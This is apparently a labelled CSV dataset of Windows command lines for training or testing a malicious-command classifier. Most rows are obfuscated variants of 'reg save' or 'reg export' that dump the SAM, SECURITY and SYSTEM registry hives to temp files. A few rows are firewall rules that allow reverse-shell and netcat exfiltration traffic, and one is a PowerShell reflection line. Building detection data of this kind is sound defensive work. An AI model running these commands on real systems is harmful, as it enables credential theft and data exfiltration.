text,label
"cmd.exe /c ""reg save hklm\sam c:\temp\v5y4p5z8.dat""",1
reg export hklm\security c:\windows\temp\uyupu6b9.save,1
reg save hklm\sam c:\windows\temp\2wlhmimd.save,1
reg save hklm\security c:\windows\temp\8om79kne.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\j9a3oir0.dat""",1
reg save hklm\system c:\windows\temp\a17khpt3.save,1
reg save hklm\system c:\windows\temp\bq2m8tz5.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\hyfswl4g.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uhw0iaow.dat""",1
reg  save  hklm\security  c:\windows\temp\032co4zb.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9hoj0nrz.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\50rfr5ti.dat""",1
reg export hklm\sam c:\windows\temp\gsm5cvkm.save,1
reg export hklm\security c:\windows\temp\esvu7pwa.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\wl15pi7z.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\d8d82ix5.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\of6ru4i2.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\50u87n7j.save""",1
reg export hklm\security c:\windows\temp\qsupkieg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ahf4azng.dat""",1
reg  export  hklm\system  c:\windows\temp\l7404elu.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\vr80pt5q.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\kvrjbs3h.dat""",1
reg save hklm\security c:\windows\temp\m00rvp16.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\liz3cbg0.dat""",1
reg export hklm\system c:\windows\temp\5tt2tupf.save,1
reg save hklm\sam c:\windows\temp\8p7y7tn5.save,1
reg  export  hklm\sam  c:\windows\temp\cr2m31mo.save,1
reg save hklm\security c:\windows\temp\uj7jf55m.save,1
reg export hklm\security c:\windows\temp\8961zsaj.save,1
reg export hklm\security c:\windows\temp\tfgo9vgv.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\57zznbww.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\p9jzckuc.dat""",1
reg save hklm\sam c:\windows\temp\ab45gs1m.save,1
reg export hklm\sam c:\windows\temp\8hffvlps.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\tlzldwlr.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\5urewvw2.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zkzjpy75.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\5e7azaut.save""",1
reg export hklm\security c:\windows\temp\d9u8nt7a.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\68j5jz6y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jgm5bulk.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\j7smzclr.dat""",1
reg export hklm\system c:\windows\temp\ymlax8ne.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\gs8wua0q.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\qhmqjlhh.save""",1
reg save hklm\security c:\windows\temp\rmh4hqea.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\9ltyfvnf.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\c747co17.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jz9m38lj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\u4glv83a.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s5p8wl86.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\ikivifjt.dat""""",1
reg export hklm\system c:\windows\temp\6vciej5n.save,1
reg save hklm\security c:\windows\temp\6ig31s67.save,1
reg save hklm\system c:\windows\temp\ugf3fnu3.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\57maock6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\8dfhtysf.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\ae4dhrmg.dat""""",1
reg export hklm\system c:\windows\temp\lc0gzgfe.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\dchu8yph.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\g0ei76zh.dat""",1
reg export hklm\security c:\windows\temp\8i4vohq8.save,1
reg save hklm\sam c:\windows\temp\0cnqtvl7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\qhqowpn7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\y8gvzsk6.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\m16thzci.save""",1
reg export hklm\security c:\windows\temp\59cdmba1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tt7oc838.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fzkvrnld.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\xkk2rdgq.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\i13tm3c0.dat""",1
reg export hklm\sam c:\windows\temp\93qusdka.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\jnse68oh.dat""",1
reg save hklm\sam c:\windows\temp\yzwlp2zq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\g88kqilg.dat""",1
reg export hklm\system c:\windows\temp\p3vfc26g.save,1
reg save hklm\sam c:\windows\temp\raq53j5m.save,1
reg export hklm\sam c:\windows\temp\s2hm1mme.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\bov1xiyf.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\xsmgds89.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\y5viox25.dat""",1
reg save hklm\security c:\windows\temp\vc6ro34j.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ogp5anx6.dat""",1
reg save hklm\system c:\windows\temp\74odxhkm.save,1
reg save hklm\system c:\windows\temp\m64zhnbu.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hpqlq7g4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\u0dyvfft.dat""",1
reg export hklm\security c:\windows\temp\73ixigrs.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\w3be2bbf.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\pshpyvzg.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\gl72w50s.dat""",1
reg save hklm\system c:\windows\temp\5rgnqb08.save,1
reg save hklm\sam c:\windows\temp\nmx3l021.save,1
reg save hklm\sam c:\windows\temp\4uj7if99.save,1
reg export hklm\system c:\windows\temp\d0wljltr.save,1
reg save hklm\sam c:\windows\temp\3xju1xjx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\h9grxbfc.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\asay9rea.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\goofzjan.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\d4djccg9.save""",1
reg save hklm\system c:\windows\temp\gv5c8pl4.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg export hklm\security c:\windows\temp\m7tvr4ll.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ohqg122l.dat""",1
reg save hklm\security c:\windows\temp\dp4gp71j.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zcvoiqld.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\qfkgim5n.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\74pn2g96.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\2jc0gmha.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ybpmbxih.dat""",1
reg save hklm\security c:\windows\temp\jfscf76l.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\lil96igv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\70vqvcg9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\my0xpd6l.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\dp0wsxq0.save""",1
reg export hklm\security c:\windows\temp\wql5ivv4.save,1
reg save hklm\security c:\windows\temp\wbqbluhk.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\9mhjigjp.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\yvkxqa1g.dat""",1
reg   save   hklm\security   c:\windows\temp\67p8eih9.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\gvw8mbyr.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ctrtc9gs.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\a7cts7yb.dat""",1
reg save hklm\security c:\windows\temp\jnzj2hlg.save,1
reg export hklm\security c:\windows\temp\g30hmfb0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ngm0vo28.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\hvxysxu3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\sc8tg72r.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\zb39hesw.dat""",1
reg save hklm\system c:\windows\temp\c1thn2fu.save,1
reg export hklm\security c:\windows\temp\w36g786m.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\b80x6h51.save""",1
reg   export   hklm\system   c:\windows\temp\c6as2xae.save,1
reg save hklm\security c:\windows\temp\8zr3q765.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ucx81ttk.dat""",1
reg save hklm\security c:\windows\temp\8dypomeb.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\45wm7upp.save""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\92yltrko.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\a6jglpr5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\60hcocei.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6uxfxtxx.dat""",1
reg export hklm\security c:\windows\temp\7sk1geya.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\eu8sigy7.save""",1
reg save hklm\system c:\windows\temp\pmio6mq1.save,1
reg export hklm\system c:\windows\temp\upha7epg.save,1
reg export hklm\system c:\windows\temp\exntzpbj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9trlzycs.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\j8fjcm3t.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\55pvkos5.dat""",1
reg export hklm\system c:\windows\temp\czo7c7z0.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\iw9bynrx.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\osrq8ddg.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\s37eothz.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\gz449eh7.dat""",1
reg save hklm\security c:\windows\temp\vagqnyu9.save,1
reg export hklm\security c:\windows\temp\ai4ptt3i.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jigpo3y8.dat""",1
reg save hklm\security c:\windows\temp\aicmbdjm.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ouj1r9yo.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\fz4dg8bm.dat""",1
reg export hklm\security c:\windows\temp\6hnibjvj.save,1
reg save hklm\sam c:\windows\temp\2tdik1if.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\vwldeo71.dat""",1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\fvszqcsg.save""",1
reg save hklm\security c:\windows\temp\m323duhn.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\wbsod6t6.save""",1
reg save hklm\system c:\windows\temp\gtqv6m7e.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wc4rwxdq.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gjpitbng.dat""",1
reg export hklm\security c:\windows\temp\6lq2h7do.save,1
reg save hklm\sam c:\windows\temp\dsno69zo.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ih2n2bjp.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\w1rjxmw2.dat""""",1
reg export hklm\sam c:\windows\temp\toiii2wa.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\t933hql4.dat""",1
reg save hklm\security c:\windows\temp\515szbo3.save,1
reg save hklm\sam c:\windows\temp\h68rxtzj.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\1uz1jldh.dat""",1
reg save hklm\security c:\windows\temp\9d22d31l.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\3q2k1hop.save""",1
reg save hklm\security c:\windows\temp\doqvm5le.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\r370jjvt.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\quvqpzeu.dat""",1
reg save hklm\sam c:\windows\temp\l360ac7o.save,1
reg   save   hklm\system   c:\windows\temp\x7jz1rdc.save,1
reg save hklm\system c:\windows\temp\vo0ryne4.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\oqkwyyy1.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\f5300uh1.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\sfc2ohs3.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kk0cv9da.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\jwp2j4yz.dat""""",1
reg save hklm\sam c:\windows\temp\pj799473.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\9c302x2q.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\ixjtmvnv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\somnuk0m.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\35r9slcj.dat""""",1
reg save hklm\sam c:\windows\temp\c0b2z3iw.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\if2j5k5m.save""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\edxi4ji6.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\fztzxob2.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\8i3ebfo0.dat""",1
reg  export  hklm\security  c:\windows\temp\a445c7g7.save,1
reg save hklm\system c:\windows\temp\krfmmsyr.save,1
reg save hklm\security c:\windows\temp\vzta5b59.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\kxig3cdq.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\on0mnpf3.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cs0gbmrl.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\g36ulxxi.dat""",1
reg save hklm\system c:\windows\temp\welzarck.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2ogrki5e.dat""",1
reg save hklm\security c:\windows\temp\mpgo1ri7.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lnfe56mg.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\c7uddhgy.dat""",1
reg save hklm\system c:\windows\temp\nfian26x.save,1
reg export hklm\sam c:\windows\temp\zlqf5lle.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\lxz1kysg.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\s1g4g6di.dat""",1
reg save hklm\security c:\windows\temp\907y8v0k.save,1
reg save hklm\security c:\windows\temp\39co7wf4.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\kp1y69o1.dat""",1
reg save hklm\system c:\windows\temp\cgkwfssh.save,1
reg save hklm\system c:\windows\temp\0rz7mtmo.save,1
reg  save  hklm\sam  c:\windows\temp\k1ps9oz9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\aroaciqd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3wlya2hy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ih7d6ngx.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\b00exihv.dat""",1
reg export hklm\security c:\windows\temp\y87olwhy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\welmujjj.dat""",1
reg export hklm\sam c:\windows\temp\4zrnuc9p.save,1
reg save hklm\sam c:\windows\temp\t9lwx7pj.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\s2zusugf.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\vylps7s7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\g325h918.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\a4zccsd5.dat""",1
reg save hklm\security c:\windows\temp\gt8anie1.save,1
reg save hklm\sam c:\windows\temp\aggfjbd8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\tje66ozl.dat""",1
reg export hklm\system c:\windows\temp\4fm6z9bi.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\lah7mcfa.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2n4l0tur.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\bxxcxpa2.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ndkqsm11.dat""",1
reg export hklm\system c:\windows\temp\n1jenq29.save,1
reg export hklm\sam c:\windows\temp\oubg7mvc.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\5m4hzfcl.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\kyr6ft6f.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1395urdc.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\m7amvvc5.dat""",1
reg save hklm\system c:\windows\temp\bl7qlser.save,1
reg save hklm\security c:\windows\temp\9xoegcum.save,1
reg export hklm\sam c:\windows\temp\pahlyxjs.save,1
reg export hklm\sam c:\windows\temp\xucslpdy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\pcyg8bba.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\besyt351.dat""",1
reg export hklm\sam c:\windows\temp\wxvs3jll.save,1
reg  save  hklm\system  c:\windows\temp\k37cpcqh.save,1
reg export hklm\sam c:\windows\temp\zy845ffi.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\50nsdcrr.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\ax6d6hvr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7kp7nvpy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\4tlz3i66.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\9m2m5o0m.dat""",1
reg   save   hklm\sam   c:\windows\temp\ohdx2g7f.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\elm13fq0.save""",1
reg save hklm\system c:\windows\temp\nvcptu8s.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\j5xpitua.dat""",1
reg export hklm\system c:\windows\temp\hegmhy0u.save,1
reg save hklm\security c:\windows\temp\8p8dbrun.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hj50t7qq.dat""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\iua9uiwq.save""",1
reg export hklm\system c:\windows\temp\3m1crucd.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\c3lu4kxb.dat""",1
reg export hklm\system c:\windows\temp\beimr1ii.save,1
reg export hklm\sam c:\windows\temp\0g4ylaqa.save,1
reg export hklm\system c:\windows\temp\mfciil5o.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7basihu2.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\cs8usrrc.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\zgydlcn3.save""",1
reg save hklm\security c:\windows\temp\j555g69o.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\2yy686zz.dat""",1
reg export hklm\security c:\windows\temp\k4h94q1s.save,1
reg save hklm\sam c:\windows\temp\sa6ph610.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\ux312471.save""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\l5uk9qu2.dat""",1
reg save hklm\system c:\windows\temp\sw0z5uq2.save,1
reg save hklm\sam c:\windows\temp\hk84vjb0.save,1
reg export hklm\system c:\windows\temp\fr4egbj4.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\x1kjn4ln.dat""",1
reg save hklm\sam c:\windows\temp\yknka2d4.save,1
reg save hklm\sam c:\windows\temp\wa5nxn6x.save,1
reg save hklm\system c:\windows\temp\mxpkao3f.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\59t9bp4l.dat""",1
reg save hklm\security c:\windows\temp\twkksd5c.save,1
reg save hklm\security c:\windows\temp\g7tkqfqm.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\whgq567z.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nhu2ffk4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\oak1zhvw.dat""",1
reg export hklm\system c:\windows\temp\rpmvjyad.save,1
reg save hklm\sam c:\windows\temp\nylbrzew.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\30yytpfj.dat""",1
reg export hklm\system c:\windows\temp\s5qtfr3l.save,1
reg save hklm\sam c:\windows\temp\pec5hf8b.save,1
reg save hklm\sam c:\windows\temp\m09us26s.save,1
reg export hklm\system c:\windows\temp\jonq2aa8.save,1
reg save hklm\security c:\windows\temp\azftv7yc.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\fb529dio.dat""",1
reg export hklm\sam c:\windows\temp\9jolfwsl.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\bj33lfi3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\azu1wodj.dat""",1
reg save hklm\security c:\windows\temp\wsgm89ix.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\4eyjivvr.dat""",1
reg export hklm\security c:\windows\temp\g6iv7uw6.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\d4obv742.dat""",1
reg  export  hklm\sam  c:\windows\temp\gnydh43l.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\li0t3456.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\yfbck5hc.dat""""",1
reg export hklm\security c:\windows\temp\h020n5lz.save,1
reg export hklm\security c:\windows\temp\8i2ys3rk.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\qi1h8rom.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\k8kbuehb.dat""",1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg export hklm\sam c:\temp\1op6mxf7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\m20ks5mu.dat""",1
reg export hklm\sam c:\windows\temp\wsum1z1p.save,1
reg export hklm\sam c:\windows\temp\j95f4wko.save,1
reg save hklm\security c:\windows\temp\jvcjnpyq.save,1
reg export hklm\security c:\windows\temp\3huz1ttq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\uixe3rq9.dat""",1
reg save hklm\system c:\windows\temp\hmwvw49s.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\el71kwem.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\48io0e0p.dat""",1
reg   export   hklm\system   c:\windows\temp\we193fvd.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dz2k3jtv.dat""",1
reg   save   hklm\sam   c:\windows\temp\j8gbj41c.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3743k7ws.dat""",1
reg save hklm\sam c:\windows\temp\w9ug1d6n.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\1qdqs4bu.dat""",1
reg   export   hklm\system   c:\windows\temp\517214pk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ml7fujz4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\96bvcl7u.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\sy9plwpt.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\wloi8n10.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6kr7y1cj.dat""",1
reg export hklm\system c:\windows\temp\4j6h17ce.save,1
reg save hklm\sam c:\windows\temp\lj9m16mt.save,1
reg export hklm\sam c:\windows\temp\hpmyoccz.save,1
reg export hklm\sam c:\windows\temp\yedmpasm.save,1
reg save hklm\system c:\windows\temp\7e1onzq6.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\aw7ggr5t.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\jdl4pekf.dat""",1
reg  save  hklm\system  c:\windows\temp\plbz9pp2.save,1
reg export hklm\security c:\windows\temp\d8lx567w.save,1
reg export hklm\system c:\windows\temp\abmo2vxi.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\b7e7h1lo.dat""",1
reg export hklm\sam c:\windows\temp\1lytp879.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0bfzx00e.dat""",1
reg export hklm\system c:\windows\temp\qqvfxxd5.save,1
reg export hklm\system c:\windows\temp\7dcwxlkx.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\p1vobf25.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5lx334vc.dat""",1
reg export hklm\sam c:\windows\temp\vaj0w6qg.save,1
reg export hklm\system c:\windows\temp\4zpf7x5q.save,1
reg export hklm\system c:\windows\temp\f22sug0z.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\d76q8ttl.save""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ot05msh8.dat""""",1
reg save hklm\security c:\windows\temp\rnxonutx.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\k709kb4l.dat""",1
"cmd.exe /c ""python -m http.server 8080""",0
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\41bbwuh7.dat""",1
reg export hklm\security c:\windows\temp\ame0sexq.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\7ic13vuf.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hlkwibu7.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\abq6varu.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\5xs91vu9.dat""",1
reg save hklm\security c:\windows\temp\1jff3a4p.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ahjp6nq5.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\w1g8fyub.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\q7k7szfy.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\kcddghk9.dat""",1
reg export hklm\system c:\windows\temp\m86burc2.save,1
reg save hklm\security c:\windows\temp\sirq2utb.save,1
reg save hklm\sam c:\windows\temp\6y4ct6fv.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\2vhjfviq.save""",1
reg export hklm\sam c:\windows\temp\fkxa8s6n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\lfp7heec.dat""",1
